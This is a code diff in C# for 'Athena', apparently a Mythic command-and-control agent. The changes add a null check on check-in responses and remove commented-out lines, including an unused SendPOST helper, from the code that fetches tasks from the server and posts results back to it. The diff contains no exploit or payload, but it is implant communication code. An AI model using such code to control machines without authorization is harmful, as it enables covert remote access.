@@ -42,6 +42,14 @@ namespace Athena
             {
                 
                 CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
+                if(cs == null)
+                {
+                    cs = new CheckinResponse()
+                    {
+                        status = "failed",
+
+                    };
+                }
                 return cs;
             }
             catch
@@ -60,9 +68,7 @@ namespace Athena
             };
             try
             {
-
                 var responseString = Send(gt).Result;
-                //GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
                 GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                 return gtr.tasks;
             }
@@ -79,7 +85,6 @@ namespace Athena
             {
                 if (job.errored)
                 {
-                    //Probably turn this into a base response object and have that
                     ResponseResult rr = new ResponseResult()
                     {
                         task_id = job.task.id,
@@ -143,7 +148,6 @@ namespace Athena
             {
                 var responseString = Send(prr).Result;
                 Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
-                //PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString).Substring(36));
                 PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString));
                 if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                 {
@@ -185,22 +189,5 @@ namespace Athena
             }
             else return "";
         }
-        /**
-        private async Task<string> SendPOST(string url, object obj)
-        {
-            try
-            {
-                string json = JsonConvert.SerializeObject(obj);
-                Console.WriteLine("Request: " + json);
-                var content = new StringContent(Misc.Base64Encode(this.MythicConfig.uuid + json));
-                var response = await Globals.client.PostAsync(url, content);
-                return await response.Content.ReadAsStringAsync();
-            }
-            catch
-            {
-                return "";
-            }
-        }
-        **/
     }
 }
